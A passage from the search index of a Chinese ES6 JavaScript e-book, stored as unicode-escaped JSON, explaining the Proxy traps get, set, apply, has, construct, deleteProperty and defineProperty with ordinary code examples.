\u5b9e\u4f8b\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u8c03\u7528\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982<code>new proxy(...args)</code>\u3002</li> </ul>"},{"location":"ebook-JSES6-RYF/14-Proxy/#proxy_1","title":"Proxy \u5b9e\u4f8b\u7684\u65b9\u6cd5","text":"<p>\u4e0b\u9762\u662f\u4e0a\u9762\u8fd9\u4e9b\u62e6\u622a\u65b9\u6cd5\u7684\u8be6\u7ec6\u4ecb\u7ecd\uff08\u4e86\u89e3\uff09\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#get","title":"get()","text":"<p><code>get</code>\u65b9\u6cd5\u7528\u4e8e\u62e6\u622a\u67d0\u4e2a\u5c5e\u6027\u7684\u8bfb\u53d6\u64cd\u4f5c\uff0c\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b21\u4e3a\u76ee\u6807\u5bf9\u8c61\u3001\u5c5e\u6027\u540d\u548c proxy \u5b9e\u4f8b\u672c\u8eab\uff08\u4e25\u683c\u5730\u8bf4\uff0c\u662f\u64cd\u4f5c\u884c\u4e3a\u6240\u9488\u5bf9\u7684\u5bf9\u8c61\uff09\uff0c\u5176\u4e2d\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u53ef\u9009\u3002</p> <p><code>get</code>\u65b9\u6cd5\u7684\u7528\u6cd5\uff0c\u4e0a\u6587\u5df2\u7ecf\u6709\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u62e6\u622a\u8bfb\u53d6\u64cd\u4f5c\u7684\u4f8b\u5b50\u3002</p> <pre><code>var person = {\n  name: \"\u5f20\u4e09\"\n};\n\nvar proxy = new Proxy(person, {\n  get: function(target, property) {\n    if (property in target) {\n      return target[property];\n    } else {\n      throw new ReferenceError(\"Property \\\"\" + property + \"\\\" does not exist.\");\n    }\n  }\n});\n\nproxy.name // \"\u5f20\u4e09\"\nproxy.age // \u629b\u51fa\u4e00\u4e2a\u9519\u8bef\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5982\u679c\u8bbf\u95ee\u76ee\u6807\u5bf9\u8c61\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u62e6\u622a\u51fd\u6570\uff0c\u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\uff0c\u53ea\u4f1a\u8fd4\u56de<code>undefined</code>\u3002</p> <p><code>get</code>\u65b9\u6cd5\u53ef\u4ee5\u7ee7\u627f\u3002</p> <pre><code>let proto = new Proxy({}, {\n  get(target, propertyKey, receiver) {\n    console.log('GET ' + propertyKey);\n    return target[propertyKey];\n  }\n});\n\nlet obj = Object.create(proto);\nobj.foo // \"GET foo\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u62e6\u622a\u64cd\u4f5c\u5b9a\u4e49\u5728<code>Prototype</code>\u5bf9\u8c61\u4e0a\u9762\uff0c\u6240\u4ee5\u5982\u679c\u8bfb\u53d6<code>obj</code>\u5bf9\u8c61\u7ee7\u627f\u7684\u5c5e\u6027\u65f6\uff0c\u62e6\u622a\u4f1a\u751f\u6548\u3002</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u4f7f\u7528<code>get</code>\u62e6\u622a\uff0c\u5b9e\u73b0\u6570\u7ec4\u8bfb\u53d6\u8d1f\u6570\u7684\u7d22\u5f15\u3002</p> <pre><code>function createArray(...elements) {\n  let handler = {\n    get(target, propKey, receiver) {\n      let index = Number(propKey);\n      if (index &lt; 0) {\n        propKey = String(target.length + index);\n      }\n      return Reflect.get(target, propKey, receiver);\n    }\n  };\n\n  let target = [];\n  target.push(...elements);\n  return new Proxy(target, handler);\n}\n\nlet arr = createArray('a', 'b', 'c');\narr[-1] // c\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u7684\u4f4d\u7f6e\u53c2\u6570\u662f<code>-1</code>\uff0c\u5c31\u4f1a\u8f93\u51fa\u6570\u7ec4\u7684\u5012\u6570\u7b2c\u4e00\u4e2a\u6210\u5458\u3002</p> <p>\u5229\u7528 Proxy\uff0c\u53ef\u4ee5\u5c06\u8bfb\u53d6\u5c5e\u6027\u7684\u64cd\u4f5c\uff08<code>get</code>\uff09\uff0c\u8f6c\u53d8\u4e3a\u6267\u884c\u67d0\u4e2a\u51fd\u6570\uff0c\u4ece\u800c\u5b9e\u73b0\u5c5e\u6027\u7684\u94fe\u5f0f\u64cd\u4f5c\u3002</p> <pre><code>var pipe = (function () {\n  return function (value) {\n    var funcStack = [];\n    var oproxy = new Proxy({} , {\n      get : function (pipeObject, fnName) {\n        if (fnName === 'get') {\n          return funcStack.reduce(function (val, fn) {\n            return fn(val);\n          },value);\n        }\n        funcStack.push(window[fnName]);\n        return oproxy;\n      }\n    });\n\n    return oproxy;\n  }\n}());\n\nvar double = n =&gt; n * 2;\nvar pow    = n =&gt; n * n;\nvar reverseInt = n =&gt; n.toString().split(\"\").reverse().join(\"\") | 0;\n\npipe(3).double.pow.reverseInt.get; // 63\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bbe\u7f6e Proxy \u4ee5\u540e\uff0c\u8fbe\u5230\u4e86\u5c06\u51fd\u6570\u540d\u94fe\u5f0f\u4f7f\u7528\u7684\u6548\u679c\u3002</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u5219\u662f\u5229\u7528<code>get</code>\u62e6\u622a\uff0c\u5b9e\u73b0\u4e00\u4e2a\u751f\u6210\u5404\u79cd DOM \u8282\u70b9\u7684\u901a\u7528\u51fd\u6570<code>dom</code>\u3002</p> <pre><code>const dom = new Proxy({}, {\n  get(target, property) {\n    return function(attrs = {}, ...children) {\n      const el = document.createElement(property);\n      for (let prop of Object.keys(attrs)) {\n        el.setAttribute(prop, attrs[prop]);\n      }\n      for (let child of children) {\n        if (typeof child === 'string') {\n          child = document.createTextNode(child);\n        }\n        el.appendChild(child);\n      }\n      return el;\n    }\n  }\n});\n\nconst el = dom.div({},\n  'Hello, my name is ',\n  dom.a({href: '//example.com'}, 'Mark'),\n  '. I like:',\n  dom.ul({},\n    dom.li({}, 'The web'),\n    dom.li({}, 'Food'),\n    dom.li({}, '\u2026actually that\\'s it')\n  )\n);\n\ndocument.body.appendChild(el);\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a<code>get</code>\u65b9\u6cd5\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u4f8b\u5b50\uff0c\u5b83\u603b\u662f\u6307\u5411\u539f\u59cb\u7684\u8bfb\u64cd\u4f5c\u6240\u5728\u7684\u90a3\u4e2a\u5bf9\u8c61\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u5c31\u662f Proxy \u5b9e\u4f8b\u3002</p> <pre><code>const proxy = new Proxy({}, {\n  get: function(target, property, receiver) {\n    return receiver;\n  }\n});\nproxy.getReceiver === proxy // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>proxy</code>\u5bf9\u8c61\u7684<code>getReceiver</code>\u5c5e\u6027\u662f\u7531<code>proxy</code>\u5bf9\u8c61\u63d0\u4f9b\u7684\uff0c\u6240\u4ee5<code>receiver</code>\u6307\u5411<code>proxy</code>\u5bf9\u8c61\u3002</p> <pre><code>const proxy = new Proxy({}, {\n  get: function(target, property, receiver) {\n    return receiver;\n  }\n});\n\nconst d = Object.create(proxy);\nd.a === d // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>d</code>\u5bf9\u8c61\u672c\u8eab\u6ca1\u6709<code>a</code>\u5c5e\u6027\uff0c\u6240\u4ee5\u8bfb\u53d6<code>d.a</code>\u7684\u65f6\u5019\uff0c\u4f1a\u53bb<code>d</code>\u7684\u539f\u578b<code>proxy</code>\u5bf9\u8c61\u627e\u3002\u8fd9\u65f6\uff0c<code>receiver</code>\u5c31\u6307\u5411<code>d</code>\uff0c\u4ee3\u8868\u539f\u59cb\u7684\u8bfb\u64cd\u4f5c\u6240\u5728\u7684\u90a3\u4e2a\u5bf9\u8c61\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u5c5e\u6027\u4e0d\u53ef\u914d\u7f6e\uff08configurable\uff09\u4e14\u4e0d\u53ef\u5199\uff08writable\uff09\uff0c\u5219 Proxy \u4e0d\u80fd\u4fee\u6539\u8be5\u5c5e\u6027\uff0c\u5426\u5219\u901a\u8fc7 Proxy \u5bf9\u8c61\u8bbf\u95ee\u8be5\u5c5e\u6027\u4f1a\u62a5\u9519\u3002</p> <pre><code>const target = Object.defineProperties({}, {\n  foo: {\n    value: 123,\n    writable: false,\n    configurable: false\n  },\n});\n\nconst handler = {\n  get(target, propKey) {\n    return 'abc';\n  }\n};\n\nconst proxy = new Proxy(target, handler);\n\nproxy.foo\n// TypeError: Invariant check failed\n</code></pre>"},{"location":"ebook-JSES6-RYF/14-Proxy/#set","title":"set()","text":"<p><code>set</code>\u65b9\u6cd5\u7528\u6765\u62e6\u622a\u67d0\u4e2a\u5c5e\u6027\u7684\u8d4b\u503c\u64cd\u4f5c\uff0c\u53ef\u4ee5\u63a5\u53d7\u56db\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b21\u4e3a\u76ee\u6807\u5bf9\u8c61\u3001\u5c5e\u6027\u540d\u3001\u5c5e\u6027\u503c\u548c Proxy \u5b9e\u4f8b\u672c\u8eab\uff0c\u5176\u4e2d\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u53ef\u9009\u3002</p> <p>\u5047\u5b9a<code>Person</code>\u5bf9\u8c61\u6709\u4e00\u4e2a<code>age</code>\u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u5e94\u8be5\u662f\u4e00\u4e2a\u4e0d\u5927\u4e8e 200 \u7684\u6574\u6570\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528<code>Proxy</code>\u4fdd\u8bc1<code>age</code>\u7684\u5c5e\u6027\u503c\u7b26\u5408\u8981\u6c42\u3002</p> <pre><code>let validator = {\n  set: function(obj, prop, value) {\n    if (prop === 'age') {\n      if (!Number.isInteger(value)) {\n        throw new TypeError('The age is not an integer');\n      }\n      if (value &gt; 200) {\n        throw new RangeError('The age seems invalid');\n      }\n    }\n\n    // \u5bf9\u4e8e\u6ee1\u8db3\u6761\u4ef6\u7684 age \u5c5e\u6027\u4ee5\u53ca\u5176\u4ed6\u5c5e\u6027\uff0c\u76f4\u63a5\u4fdd\u5b58\n    obj[prop] = value;\n  }\n};\n\nlet person = new Proxy({}, validator);\n\nperson.age = 100;\n\nperson.age // 100\nperson.age = 'young' // \u62a5\u9519\nperson.age = 300 // \u62a5\u9519\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u8bbe\u7f6e\u4e86\u5b58\u503c\u51fd\u6570<code>set</code>\uff0c\u4efb\u4f55\u4e0d\u7b26\u5408\u8981\u6c42\u7684<code>age</code>\u5c5e\u6027\u8d4b\u503c\uff0c\u90fd\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff0c\u8fd9\u662f\u6570\u636e\u9a8c\u8bc1\u7684\u4e00\u79cd\u5b9e\u73b0\u65b9\u6cd5\u3002\u5229\u7528<code>set</code>\u65b9\u6cd5\uff0c\u8fd8\u53ef\u4ee5\u6570\u636e\u7ed1\u5b9a\uff0c\u5373\u6bcf\u5f53\u5bf9\u8c61\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u4f1a\u81ea\u52a8\u66f4\u65b0 DOM\u3002</p> <p>\u6709\u65f6\uff0c\u6211\u4eec\u4f1a\u5728\u5bf9\u8c61\u4e0a\u9762\u8bbe\u7f6e\u5185\u90e8\u5c5e\u6027\uff0c\u5c5e\u6027\u540d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4f7f\u7528\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u8868\u793a\u8fd9\u4e9b\u5c5e\u6027\u4e0d\u5e94\u8be5\u88ab\u5916\u90e8\u4f7f\u7528\u3002\u7ed3\u5408<code>get</code>\u548c<code>set</code>\u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u505a\u5230\u9632\u6b62\u8fd9\u4e9b\u5185\u90e8\u5c5e\u6027\u88ab\u5916\u90e8\u8bfb\u5199\u3002</p> <pre><code>const handler = {\n  get (target, key) {\n    invariant(key, 'get');\n    return target[key];\n  },\n  set (target, key, value) {\n    invariant(key, 'set');\n    target[key] = value;\n    return true;\n  }\n};\nfunction invariant (key, action) {\n  if (key[0] === '_') {\n    throw new Error(`Invalid attempt to ${action} private \"${key}\" property`);\n  }\n}\nconst target = {};\nconst proxy = new Proxy(target, handler);\nproxy._prop\n// Error: Invalid attempt to get private \"_prop\" property\nproxy._prop = 'c'\n// Error: Invalid attempt to set private \"_prop\" property\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u8981\u8bfb\u5199\u7684\u5c5e\u6027\u540d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u4e0b\u5212\u7ebf\uff0c\u4e00\u5f8b\u629b\u9519\uff0c\u4ece\u800c\u8fbe\u5230\u7981\u6b62\u8bfb\u5199\u5185\u90e8\u5c5e\u6027\u7684\u76ee\u7684\u3002</p> <p>\u4e0b\u9762\u662f<code>set</code>\u65b9\u6cd5\u7b2c\u56db\u4e2a\u53c2\u6570\u7684\u4f8b\u5b50\u3002</p> <pre><code>const handler = {\n  set: function(obj, prop, value, receiver) {\n    obj[prop] = receiver;\n  }\n};\nconst proxy = new Proxy({}, handler);\nproxy.foo = 'bar';\nproxy.foo === proxy // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>set</code>\u65b9\u6cd5\u7684\u7b2c\u56db\u4e2a\u53c2\u6570<code>receiver</code>\uff0c\u6307\u7684\u662f\u539f\u59cb\u7684\u64cd\u4f5c\u884c\u4e3a\u6240\u5728\u7684\u90a3\u4e2a\u5bf9\u8c61\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u662f<code>proxy</code>\u5b9e\u4f8b\u672c\u8eab\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002</p> <pre><code>const handler = {\n  set: function(obj, prop, value, receiver) {\n    obj[prop] = receiver;\n  }\n};\nconst proxy = new Proxy({}, handler);\nconst myObj = {};\nObject.setPrototypeOf(myObj, proxy);\n\nmyObj.foo = 'bar';\nmyObj.foo === myObj // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8bbe\u7f6e<code>myObj.foo</code>\u5c5e\u6027\u7684\u503c\u65f6\uff0c<code>myObj</code>\u5e76\u6ca1\u6709<code>foo</code>\u5c5e\u6027\uff0c\u56e0\u6b64\u5f15\u64ce\u4f1a\u5230<code>myObj</code>\u7684\u539f\u578b\u94fe\u53bb\u627e<code>foo</code>\u5c5e\u6027\u3002<code>myObj</code>\u7684\u539f\u578b\u5bf9\u8c61<code>proxy</code>\u662f\u4e00\u4e2a Proxy \u5b9e\u4f8b\uff0c\u8bbe\u7f6e\u5b83\u7684<code>foo</code>\u5c5e\u6027\u4f1a\u89e6\u53d1<code>set</code>\u65b9\u6cd5\u3002\u8fd9\u65f6\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570<code>receiver</code>\u5c31\u6307\u5411\u539f\u59cb\u8d4b\u503c\u884c\u4e3a\u6240\u5728\u7684\u5bf9\u8c61<code>myObj</code>\u3002</p> <p>\u6ce8\u610f\uff0c\u5982\u679c\u76ee\u6807\u5bf9\u8c61\u81ea\u8eab\u7684\u67d0\u4e2a\u5c5e\u6027\uff0c\u4e0d\u53ef\u5199\u4e14\u4e0d\u53ef\u914d\u7f6e\uff0c\u90a3\u4e48<code>set</code>\u65b9\u6cd5\u5c06\u4e0d\u8d77\u4f5c\u7528\u3002</p> <pre><code>const obj = {};\nObject.defineProperty(obj, 'foo', {\n  value: 'bar',\n  writable: false,\n});\n\nconst handler = {\n  set: function(obj, prop, value, receiver) {\n    obj[prop] = 'baz';\n  }\n};\n\nconst proxy = new Proxy(obj, handler);\nproxy.foo = 'baz';\nproxy.foo // \"bar\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>obj.foo</code>\u5c5e\u6027\u4e0d\u53ef\u5199\uff0cProxy \u5bf9\u8fd9\u4e2a\u5c5e\u6027\u7684<code>set</code>\u4ee3\u7406\u5c06\u4e0d\u4f1a\u751f\u6548\u3002</p> <p>\u6ce8\u610f\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c<code>set</code>\u4ee3\u7406\u5982\u679c\u6ca1\u6709\u8fd4\u56de<code>true</code>\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>'use strict';\nconst handler = {\n  set: function(obj, prop, value, receiver) {\n    obj[prop] = receiver;\n    // \u65e0\u8bba\u6709\u6ca1\u6709\u4e0b\u9762\u8fd9\u4e00\u884c\uff0c\u90fd\u4f1a\u62a5\u9519\n    return false;\n  }\n};\nconst proxy = new Proxy({}, handler);\nproxy.foo = 'bar';\n// TypeError: 'set' on proxy: trap returned falsish for property 'foo'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c<code>set</code>\u4ee3\u7406\u8fd4\u56de<code>false</code>\u6216\u8005<code>undefined</code>\uff0c\u90fd\u4f1a\u62a5\u9519\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#apply","title":"apply()","text":"<p><code>apply</code>\u65b9\u6cd5\u62e6\u622a\u51fd\u6570\u7684\u8c03\u7528\u3001<code>call</code>\u548c<code>apply</code>\u64cd\u4f5c\u3002</p> <p><code>apply</code>\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u76ee\u6807\u5bf9\u8c61\u3001\u76ee\u6807\u5bf9\u8c61\u7684\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff08<code>this</code>\uff09\u548c\u76ee\u6807\u5bf9\u8c61\u7684\u53c2\u6570\u6570\u7ec4\u3002</p> <pre><code>var handler = {\n  apply (target, ctx, args) {\n    return Reflect.apply(...arguments);\n  }\n};\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>var target = function () { return 'I am the target'; };\nvar handler = {\n  apply: function () {\n    return 'I am the proxy';\n  }\n};\n\nvar p = new Proxy(target, handler);\n\np()\n// \"I am the proxy\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>p</code>\u662f Proxy \u7684\u5b9e\u4f8b\uff0c\u5f53\u5b83\u4f5c\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\uff08<code>p()</code>\uff09\uff0c\u5c31\u4f1a\u88ab<code>apply</code>\u65b9\u6cd5\u62e6\u622a\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>var twice = {\n  apply (target, ctx, args) {\n    return Reflect.apply(...arguments) * 2;\n  }\n};\nfunction sum (left, right) {\n  return left + right;\n};\nvar proxy = new Proxy(sum, twice);\nproxy(1, 2) // 6\nproxy.call(null, 5, 6) // 22\nproxy.apply(null, [7, 8]) // 30\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6bcf\u5f53\u6267\u884c<code>proxy</code>\u51fd\u6570\uff08\u76f4\u63a5\u8c03\u7528\u6216<code>call</code>\u548c<code>apply</code>\u8c03\u7528\uff09\uff0c\u5c31\u4f1a\u88ab<code>apply</code>\u65b9\u6cd5\u62e6\u622a\u3002</p> <p>\u53e6\u5916\uff0c\u76f4\u63a5\u8c03\u7528<code>Reflect.apply</code>\u65b9\u6cd5\uff0c\u4e5f\u4f1a\u88ab\u62e6\u622a\u3002</p> <pre><code>Reflect.apply(proxy, null, [9, 10]) // 38\n</code></pre>"},{"location":"ebook-JSES6-RYF/14-Proxy/#has","title":"has()","text":"<p><code>has</code>\u65b9\u6cd5\u7528\u6765\u62e6\u622a<code>HasProperty</code>\u64cd\u4f5c\uff0c\u5373\u5224\u65ad\u5bf9\u8c61\u662f\u5426\u5177\u6709\u67d0\u4e2a\u5c5e\u6027\u65f6\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u751f\u6548\u3002\u5178\u578b\u7684\u64cd\u4f5c\u5c31\u662f<code>in</code>\u8fd0\u7b97\u7b26\u3002</p> <p><code>has</code>\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u76ee\u6807\u5bf9\u8c61\u3001\u9700\u67e5\u8be2\u7684\u5c5e\u6027\u540d\u3002</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u4f7f\u7528<code>has</code>\u65b9\u6cd5\u9690\u85cf\u67d0\u4e9b\u5c5e\u6027\uff0c\u4e0d\u88ab<code>in</code>\u8fd0\u7b97\u7b26\u53d1\u73b0\u3002</p> <pre><code>var handler = {\n  has (target, key) {\n    if (key[0] === '_') {\n      return false;\n    }\n    return key in target;\n  }\n};\nvar target = { _prop: 'foo', prop: 'foo' };\nvar proxy = new Proxy(target, handler);\n'_prop' in proxy // false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u539f\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u4e0b\u5212\u7ebf\uff0c<code>proxy.has</code>\u5c31\u4f1a\u8fd4\u56de<code>false</code>\uff0c\u4ece\u800c\u4e0d\u4f1a\u88ab<code>in</code>\u8fd0\u7b97\u7b26\u53d1\u73b0\u3002</p> <p>\u5982\u679c\u539f\u5bf9\u8c61\u4e0d\u53ef\u914d\u7f6e\u6216\u8005\u7981\u6b62\u6269\u5c55\uff0c\u8fd9\u65f6<code>has</code>\u62e6\u622a\u4f1a\u62a5\u9519\u3002</p> <pre><code>var obj = { a: 10 };\nObject.preventExtensions(obj);\n\nvar p = new Proxy(obj, {\n  has: function(target, prop) {\n    return false;\n  }\n});\n\n'a' in p // TypeError is thrown\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>obj</code>\u5bf9\u8c61\u7981\u6b62\u6269\u5c55\uff0c\u7ed3\u679c\u4f7f\u7528<code>has</code>\u62e6\u622a\u5c31\u4f1a\u62a5\u9519\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u67d0\u4e2a\u5c5e\u6027\u4e0d\u53ef\u914d\u7f6e\uff08\u6216\u8005\u76ee\u6807\u5bf9\u8c61\u4e0d\u53ef\u6269\u5c55\uff09\uff0c\u5219<code>has</code>\u65b9\u6cd5\u5c31\u4e0d\u5f97\u201c\u9690\u85cf\u201d\uff08\u5373\u8fd4\u56de<code>false</code>\uff09\u76ee\u6807\u5bf9\u8c61\u7684\u8be5\u5c5e\u6027\u3002</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c<code>has</code>\u65b9\u6cd5\u62e6\u622a\u7684\u662f<code>HasProperty</code>\u64cd\u4f5c\uff0c\u800c\u4e0d\u662f<code>HasOwnProperty</code>\u64cd\u4f5c\uff0c\u5373<code>has</code>\u65b9\u6cd5\u4e0d\u5224\u65ad\u4e00\u4e2a\u5c5e\u6027\u662f\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u8fd8\u662f\u7ee7\u627f\u7684\u5c5e\u6027\u3002</p> <p>\u53e6\u5916\uff0c\u867d\u7136<code>for...in</code>\u5faa\u73af\u4e5f\u7528\u5230\u4e86<code>in</code>\u8fd0\u7b97\u7b26\uff0c\u4f46\u662f<code>has</code>\u62e6\u622a\u5bf9<code>for...in</code>\u5faa\u73af\u4e0d\u751f\u6548\u3002</p> <pre><code>let stu1 = {name: '\u5f20\u4e09', score: 59};\nlet stu2 = {name: '\u674e\u56db', score: 99};\n\nlet handler = {\n  has(target, prop) {\n    if (prop === 'score' &amp;&amp; target[prop] &lt; 60) {\n      console.log(`${target.name} \u4e0d\u53ca\u683c`);\n      return false;\n    }\n    return prop in target;\n  }\n}\n\nlet oproxy1 = new Proxy(stu1, handler);\nlet oproxy2 = new Proxy(stu2, handler);\n\n'score' in oproxy1\n// \u5f20\u4e09 \u4e0d\u53ca\u683c\n// false\n\n'score' in oproxy2\n// true\n\nfor (let a in oproxy1) {\n  console.log(oproxy1[a]);\n}\n// \u5f20\u4e09\n// 59\n\nfor (let b in oproxy2) {\n  console.log(oproxy2[b]);\n}\n// \u674e\u56db\n// 99\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>has</code>\u62e6\u622a\u53ea\u5bf9<code>in</code>\u8fd0\u7b97\u7b26\u751f\u6548\uff0c\u5bf9<code>for...in</code>\u5faa\u73af\u4e0d\u751f\u6548\uff0c\u5bfc\u81f4\u4e0d\u7b26\u5408\u8981\u6c42\u7684\u5c5e\u6027\u6ca1\u6709\u88ab<code>for...in</code>\u5faa\u73af\u6240\u6392\u9664\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#construct","title":"construct()","text":"<p><code>construct</code>\u65b9\u6cd5\u7528\u4e8e\u62e6\u622a<code>new</code>\u547d\u4ee4\uff0c\u4e0b\u9762\u662f\u62e6\u622a\u5bf9\u8c61\u7684\u5199\u6cd5\u3002</p> <pre><code>var handler = {\n  construct (target, args, newTarget) {\n    return new target(...args);\n  }\n};\n</code></pre> <p><code>construct</code>\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002</p> <ul> <li><code>target</code>\uff1a\u76ee\u6807\u5bf9\u8c61</li> <li><code>args</code>\uff1a\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u5bf9\u8c61</li> <li><code>newTarget</code>\uff1a\u521b\u9020\u5b9e\u4f8b\u5bf9\u8c61\u65f6\uff0c<code>new</code>\u547d\u4ee4\u4f5c\u7528\u7684\u6784\u9020\u51fd\u6570\uff08\u4e0b\u9762\u4f8b\u5b50\u7684<code>p</code>\uff09</li> </ul> <pre><code>var p = new Proxy(function () {}, {\n  construct: function(target, args) {\n    console.log('called: ' + args.join(', '));\n    return { value: args[0] * 10 };\n  }\n});\n\n(new p(1)).value\n// \"called: 1\"\n// 10\n</code></pre> <p><code>construct</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u5fc5\u987b\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002</p> <pre><code>var p = new Proxy(function() {}, {\n  construct: function(target, argumentsList) {\n    return 1;\n  }\n});\n\nnew p() // \u62a5\u9519\n// Uncaught TypeError: 'construct' on proxy: trap returned non-object ('1')\n</code></pre>"},{"location":"ebook-JSES6-RYF/14-Proxy/#deleteproperty","title":"deleteProperty()","text":"<p><code>deleteProperty</code>\u65b9\u6cd5\u7528\u4e8e\u62e6\u622a<code>delete</code>\u64cd\u4f5c\uff0c\u5982\u679c\u8fd9\u4e2a\u65b9\u6cd5\u629b\u51fa\u9519\u8bef\u6216\u8005\u8fd4\u56de<code>false</code>\uff0c\u5f53\u524d\u5c5e\u6027\u5c31\u65e0\u6cd5\u88ab<code>delete</code>\u547d\u4ee4\u5220\u9664\u3002</p> <pre><code>var handler = {\n  deleteProperty (target, key) {\n    invariant(key, 'delete');\n    delete target[key];\n    return true;\n  }\n};\nfunction invariant (key, action) {\n  if (key[0] === '_') {\n    throw new Error(`Invalid attempt to ${action} private \"${key}\" property`);\n  }\n}\n\nvar target = { _prop: 'foo' };\nvar proxy = new Proxy(target, handler);\ndelete proxy._prop\n// Error: Invalid attempt to delete private \"_prop\" property\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>deleteProperty</code>\u65b9\u6cd5\u62e6\u622a\u4e86<code>delete</code>\u64cd\u4f5c\u7b26\uff0c\u5220\u9664\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e3a\u4e0b\u5212\u7ebf\u7684\u5c5e\u6027\u4f1a\u62a5\u9519\u3002</p> <p>\u6ce8\u610f\uff0c\u76ee\u6807\u5bf9\u8c61\u81ea\u8eab\u7684\u4e0d\u53ef\u914d\u7f6e\uff08configurable\uff09\u7684\u5c5e\u6027\uff0c\u4e0d\u80fd\u88ab<code>deleteProperty</code>\u65b9\u6cd5\u5220\u9664\uff0c\u5426\u5219\u62a5\u9519\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#defineproperty","title":"defineProperty()","text":"<p><code>defineProperty</code>\u65b9\u6cd5\u62e6\u622a\u4e86<code>Object.defineProperty</code>\u64cd\u4f5c\u3002</p> <pre><code>var handler = {\n  defineProperty (target, key, descriptor) {\n    return false;\n  }\n};\nvar target = {};\nvar proxy = new Proxy(target, handler);\nproxy.foo = 'bar' // \u4e0d\u4f1a\u751f\u6548\n</code></pre> 